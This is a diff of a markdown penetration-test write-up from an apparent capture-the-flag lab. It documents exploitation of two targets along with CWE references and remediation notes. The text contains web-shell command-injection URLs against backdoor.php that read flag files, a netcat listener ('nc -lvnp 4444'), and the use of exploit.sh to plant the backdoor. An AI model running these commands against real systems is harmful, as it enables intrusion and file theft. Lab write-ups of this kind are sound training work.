@@ -212,7 +212,7 @@ The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve 
     - **Exploit Used**
       - (Common Weakness) CWE-250: Execution with Unnecessary Privileges
       User steven has excessive privilege
-      ![excess-priv]/images/sudo-steven_Target1.PNG
+      ![excess-priv](/images/sudo-steven_Target1.PNG)
     REMEDIATION: The principle of least privilege should be enforced.
      Limit sudo to specific functions that require it, such as restarting a service that runs with root privilege
      We need to run visudo to edit /etc/sudoers or add specific config under the /etc/sudoers.d directory
@@ -238,23 +238,31 @@ The Red Team was able to penetrate both `Target 1` and `Target 2`, and retrieve 
     - **Exploit Used**
       - (Common Weakness) CWE-78: Improper Sanitization of Special Elements used in an OS Command
       - '192.168.1.115/backdoor.php?cmd=find+/var/www+-type+f+iname+'flag*''
-      ![find.flags](/Images/find-flags_Target2.png)
+      
+      ![findflags](/Images/find-flags_Target2.png)
+      
            (the path to flag3 is also disclosed here)
+	   
       - '192.168.1.115/backdoor.php?cmd=cat+/var/www/flag2.txt'
+      
     REMEDIATION: Proper input controls within the application would prevent the execution of this exploit. 
      
      Establishing the backdoor;
      The script provided was edited to include the IP of target2
      exploit.sh generates backdoor.php on the target, encoded with functions to allow command injection 
+     
     ![backdoor.php](/Images/edited-exploit_Target2.png)
+    
     Prior to execution, establish a netcat session: 'nc -lvnp 4444' 
      './exploit.sh'
+     
     ![runExploit](/Images/run-exploit_Target2.png)
+    
     We now have a command injection script (backdoor.php) on Target 2 that is accessible via browser.
 **Y'all are running components with known vulnerabilities**
 
   - flag3 hash value: `a0f568aa9de277887f37730d71520d9b`
-     ![flag3-T2](/Images/flag3-found_Target2.png)
+     ![flag3-T2](/Images/flag3-found_Target2.PNG)
     - **Exploit Used**
       - (Common Weakness) CWE-522: Local file inclusion
       - '192.168.1.115/wordpress/wp-content/uploads/2018/11/flag3.png'
